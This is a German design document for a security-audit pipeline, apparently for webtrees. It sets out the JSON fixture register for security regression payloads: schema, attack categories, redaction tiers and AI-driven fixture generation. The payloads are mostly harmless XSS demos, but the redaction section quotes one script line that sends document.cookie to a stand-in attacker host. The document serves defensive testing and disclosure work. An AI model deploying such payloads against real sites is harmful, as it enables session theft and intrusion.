<!-- SPDX-License-Identifier: AGPL-3.0-or-later -->

# 09 — Fixture Register (Security Payloads)

**Zweck:** Struktur, Kategorien und Regeln für Payload-Fixtures, die von `SecAudit<NNN>Test` (Layer 3) und `sec-audit-<NNN>.spec.ts` (Layer 4) gemeinsam genutzt werden.

**Vorgänger:** `08_layer_integration.md` §4 (Fixture-Bindung).
**Nachfolger:** `10_fixing_and_disclosure.md` §… (Fixture-Weitergabe im Disclosure-Workflow).

## 1. Ablage

- Basis-Verzeichnis: `fixtures/security/payloads/` (im Repo-Root, nicht unter `layer3-integration/` oder `layer4-e2e/` — beide Layer zeigen darauf).
- Eine JSON-Datei pro Task: `sec_audit_<NNN>.json`
- Unterordner für binäre Payloads (z. B. Medien-Upload-PoCs): `fixtures/security/payloads/blobs/sec_audit_<NNN>/<dateiname>`

**Verzeichnisstruktur-Überblick:**

```
fixtures/security/
├── README.md                       # Index, Verweis auf diese Datei
├── payloads/
│   ├── sec_audit_001.json
│   ├── sec_audit_042.json
│   ├── ...
│   └── blobs/
│       └── sec_audit_042/
│           ├── malicious.gif       # z. B. GIF-Header + PHP-Body
│           └── oversize.jpg
└── gedcoms/                        # Ggf. ganze GEDCOM-Dateien als Payload
    └── sec_audit_017_injected.ged
```

## 2. JSON-Schema

```json
{
  "task": "SEC-AUDIT-042",
  "created": "2026-04-08",
  "last_updated": "2026-04-08",
  "fixtures_rev": 1,
  "source_hypothesis": "hypotheses.md H1, H2",
  "redaction_policy": "public-ready",
  "H1": [
    {
      "name": "smart_quotes_break_sanitizer",
      "category": "xss",
      "equivalence_class": "control_chars_u2018_u2019",
      "payload": {
        "note_raw": "Benign text \u2018onerror=alert(1)\u2019",
        "tree": "xss-sandbox"
      },
      "should_be_blocked": true,
      "expected_trace_branch": "NoteSanitizer::strip#fallback",
      "notes": "Smart-Quote-Roundtrip umgeht htmlspecialchars()-basierte Sanitization."
    },
    {
      "name": "legitimate_smart_quotes",
      "category": "xss",
      "equivalence_class": "control_chars_u2018_u2019",
      "payload": {
        "note_raw": "She said \u2018hello\u2019 to the family.",
        "tree": "xss-sandbox"
      },
      "should_be_blocked": false,
      "expected_trace_branch": "NoteSanitizer::strip#passthrough",
      "notes": "Äquivalenz-Partitioning: legitime Nutzung derselben Unicode-Klasse darf nicht blockiert werden."
    }
  ],
  "H2": [
    {
      "name": "html_entity_decode_double_pass",
      "category": "xss",
      "equivalence_class": "entity_double_decode",
      "payload": {
        "note_raw": "&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;",
        "tree": "xss-sandbox"
      },
      "should_be_blocked": true,
      "expected_trace_branch": "NoteSanitizer::strip#entity_decode",
      "notes": "Doppeltes entity_decode() im Note-Parser; erste Pass enkodiert, zweite Pass erzeugt aktive Tags."
    }
  ]
}
```

### 2.1 Pflicht-Felder (Top-Level)

| Feld | Typ | Bedeutung |
|---|---|---|
| `task` | string | Exakt die Task-ID `SEC-AUDIT-<NNN>` |
| `created` | ISO date | Datum der Erstellung |
| `last_updated` | ISO date | Datum der letzten Payload-Änderung |
| `fixtures_rev` | int | Monoton steigend, `+1` bei jeder Payload-Änderung nach initialer Erzeugung |
| `source_hypothesis` | string | Verweis auf `hypotheses.md` Abschnitt |
| `redaction_policy` | string | Eine von: `public-ready`, `embargoed`, `internal-only` — siehe §4 |
| `H<n>` | array | Pro bestätigter Hypothese ein Array von Payload-Objekten |

### 2.2 Pflicht-Felder (pro Payload-Objekt)

| Feld | Typ | Bedeutung |
|---|---|---|
| `name` | string, snake_case | Eindeutig innerhalb der Hypothese; wird als PHPUnit-Testmethoden-Label verwendet |
| `category` | string | Eine aus §3 |
| `equivalence_class` | string | Gruppiert Payloads zur Äquivalenz-Partitioning-Logik |
| `payload` | object | Die eigentlichen Daten; frei strukturiert je nach Angriffsvektor |
| `should_be_blocked` | boolean | Post-Fix-Oracle: `true` = Regression erwartet Block, `false` = Regression erwartet Durchlass |
| `expected_trace_branch` | string | Referenz auf einen Branch im `SecurityTraceMiddleware`-Log (`05_security_trace_middleware.md` §4) |
| `notes` | string | Kurzerklärung der Technik; **keine** Exploit-Details in public-ready-Fixtures |

**Nicht-Pflicht:**

| Feld | Bedeutung |
|---|---|
| `blob_path` | Pfad zu einer Datei unter `blobs/sec_audit_<NNN>/` (relativ zu `fixtures/security/payloads/`) |
| `gedcom_path` | Pfad zu einer GEDCOM-Datei unter `fixtures/security/gedcoms/` |
| `auth_context` | Objekt mit `role`, `username`, `session_attrs` — wird von `SecurityAuditTestCase` vor dem Request gesetzt |
| `depends_on_fixture_rev` | int | Wenn der Payload nur bis zu einer bestimmten Fixture-Revision passt — selten nötig |

## 3. Kategorien

Die `category`-Werte sind **geschlossen** — neue Kategorien nur mit Update dieser Datei. Jede Kategorie mappt auf eine oder mehrere Vertikale (V1..V12 aus `02_threat_model.md`).

| Kategorie | Vertikale | Beispiele |
|---|---|---|
| `auth_bypass` | V1, V8 | Cookie-Manipulation, Timing-Leaks im Login, 2FA-Skip |
| `authz_escalation` | V1, V12 | Role-Downgrade-Umgehung, CSRF mit State-Change |
| `gedcom_injection` | V2, V11 | Control-Char-Injection im GEDCOM-Parser, Second-Order-Import |
| `media_upload` | V3, V7, V9 | Doppel-Extension, Polyglot-Files, Path-Traversal im Upload-Pfad |
| `ssrf` | V4 | URL-Fetcher, Remote-Image-Loader, Avatar-Proxy |
| `xss` | V5 | Script-Tags in Notes, Event-Handler in Attributen |
| `sqli` | V6 | Such-Filter, Sort-Parameter, JSON-Key-Manipulation |
| `path_traversal` | V7 | Media-Downloader, Theme-Loader, Backup-Restore |
| `deserialization` | V10 | Session-Payload, Cache-Payload, Serialized-User-Prefs |
| `sandbox_escape` | V9, sonstige | exec/eval/include-Variable auch bei Admin-Track |
| `csrf` | V12 | State-Changing Routes ohne CSRF-Token |
| `other` | — | Nur wenn **keine** Kategorie passt; erzwingt Begründung im `notes`-Feld |

## 4. Redaction-Policy

Payloads können sensibel sein (funktionsfähige Exploits). Deswegen hat jede Fixture-Datei einen `redaction_policy`-Wert:

### 4.1 `public-ready`

- Darf im Repo öffentlich liegen.
- Payload ist **so formuliert**, dass er die Schwachstelle triggert, aber **keinen funktionsfähigen RCE** liefert (z. B. nutzt `alert(1)` statt Fetch an externe Server).
- Beispiel: `"<script>alert(document.cookie)</script>"` ist public-ready. `"<script>fetch('https://attacker.example/'+document.cookie)</script>"` ist es **nicht**.
- Default für alle Tasks **nach** `10_fixing_and_disclosure.md`-Disclosure.

### 4.2 `embargoed`

- Payload triggert die Schwachstelle vollständig (inkl. realistischer Exfiltrations- oder Execution-Ketten).
- Datei bleibt im Repo, aber der Dateiinhalt wird vor dem Commit gegen eine Platzhalter-Version ersetzt (`"payload": {"note_raw": "<REDACTED — embargo SEC-AUDIT-042>"}`).
- Die volle Version liegt außerhalb des Repos unter `$XDG_DATA_HOME/webtrees-security-audit/payloads/sec_audit_<NNN>.full.json` — der Driver entpackt sie bei Probe-/Validation-Runs und gibt sie am Ende wieder frei.
- `embargoed` solange Status `fix_verified` noch nicht vom User freigegeben wurde (manuelle Review gemäß V1-Workflow).

### 4.3 `internal-only`

- Payload darf **nicht** öffentlich werden (z. B. enthält Credentials aus einem Threat-Intel-Dump, oder würde bei Leak andere Downstream-Projekte gefährden).
- Wird **nie** in `fixtures/security/payloads/` commitiert, sondern nur als Referenz: `"payload_ref": "$XDG_DATA_HOME/webtrees-security-audit/payloads/sec_audit_<NNN>.internal.json"`.
- Task-Status `fix_verified` darf erreicht werden, aber die Disclosure-Phase aus `10_fixing_and_disclosure.md` stoppt, bis der Payload re-klassifiziert werden kann.

### 4.4 Redaction-Regeln im Detail

| Bestandteil | `public-ready` | `embargoed` | `internal-only` |
|---|---|---|---|
| Trigger-Logik (Vektor beschrieben in `notes`) | Ja | Ja | Nein (`notes: "siehe internal"`) |
| Vollständiger Payload | Harmlose Demo | Platzhalter im Repo, Voll-Version extern | Keine Version im Repo |
| `expected_trace_branch` | Ja | Ja | Ja |
| Binäre Blobs | Erlaubt (harmlos) | Extern, Verweis per Pfad | Extern, Verweis per Pfad |
| Automatischer Probe-Run durch Driver | Ja | Ja (nach Dekompression) | Ja (nach Dekompression) |
| Regression in `make test-integration` | Ja | Ja (mit Dekompression via Env-Var) | Nur bei lokal gesetzter Env-Var `SECURITY_INTERNAL_FIXTURES=1` |

## 5. Fixture-Erzeugung

### 5.1 Initiale Erzeugung

In Phase D5 des Deep-Dive-Drivers (`06_agentic_loop_driver.md` §4) erzeugt Opus auf Basis der `hypotheses.md` Probe-Specs eine **erste Version** der Fixture-Datei:

1. Driver liefert Opus die `hypotheses.md` + eine Vorlage dieser Datei.
2. Opus füllt pro bestätigter Hypothese mindestens **zwei** Payloads: einen malicious (`should_be_blocked: true`) und einen legitimen (`should_be_blocked: false`), jeweils in derselben `equivalence_class`.
3. Driver validiert gegen JSON-Schema aus §2 (`jq` + manuelles Schema-File `fixtures/security/payloads/.schema.json`, siehe §6).
4. Fixture wird mit `redaction_policy: embargoed` initialisiert, Task-Frontmatter bekommt `fixture_rev: 1`.

### 5.2 Iteration und Erweiterung

Wenn `prompt_05_validation.md` ein Finding bestätigt, die Regression aber nur einen Teil der Äquivalenz-Klassen abdeckt, kann der User manuell weitere Payloads hinzufügen. Regeln:

- `fixtures_rev` hochzählen.
- `last_updated` setzen.
- Neue Payloads in derselben Datei anhängen; **keine** neuen Dateien pro Revision.
- Layer-3-Regression-Test muss bei Neuladen der Fixture nicht geändert werden, solange der DataProvider (`08_layer_integration.md` §2.4) über alle Array-Einträge iteriert.

### 5.3 Löschung / Archivierung

Fixtures werden **nicht** gelöscht, auch nicht nach Fix. Begründung: Der Audit-Trail muss belegen, dass die Regression nach Patch weiterhin grün ist. Statt Löschung wird die `redaction_policy` gewechselt (`embargoed` → `public-ready`).

Archivierung **nicht benötigt** — Fixtures sind klein und bleiben im Repo.

## 6. JSON-Schema-Datei

Eine maschinenlesbare Schema-Datei liegt unter `fixtures/security/payloads/.schema.json`. Der Driver validiert bei jedem Lauf:

```bash
# Pseudo-Code (echter Call läuft durch den Driver):
for f in fixtures/security/payloads/sec_audit_*.json; do
  jq --argfile schema fixtures/security/payloads/.schema.json \
     '. as $doc | [...]' \
     "$f" || echo "Schema-Fehler: $f"
done
```

Bei Schema-Fehler: Fixture wird nicht geladen, Task-Status bleibt stehen, User-Eingriff nötig.

Das Schema wird in Task #9 (dieser Datei) spezifiziert, aber **nicht** hier als JSON kopiert — es wird zur Initial-Erzeugung vom Driver aus §2 synthetisiert und als eigene Datei gepflegt.

## 7. Minimale Beispieldatei

Bei der Initial-Erzeugung der Audit-Pipeline legt der Driver eine `fixtures/security/payloads/.example.json` an, die das Schema zeigt, aber **keine** echte Task betrifft — nur ein Demo-Payload mit `task: "SEC-AUDIT-EXAMPLE"` und einem leeren, selbsterklärenden Inhalt. Diese Datei wird von keinem Test geladen und dient nur als Entwickler-Referenz.

## 8. Abgrenzung

- **Keine** Fixture darf Credentials aus der Produktiv-Umgebung enthalten (auch nicht als Platzhalter-String, der zufällig korrekt aussieht).
- **Keine** Fixture darf auf externe URLs zeigen, außer auf Container-interne Fake-Endpoints (`mock-ssrf-target:8080`, siehe `prompt_03_exploit_attempt.md` §6 Regel 3).
- **Keine** Fixture darf größere Binär-Dateien im JSON selbst enthalten — Blobs immer in `blobs/sec_audit_<NNN>/` ablegen und per `blob_path` referenzieren.

Weiter: `10_fixing_and_disclosure.md` (Fix-Workflow, Branch-Naming, Embargo-Policy).
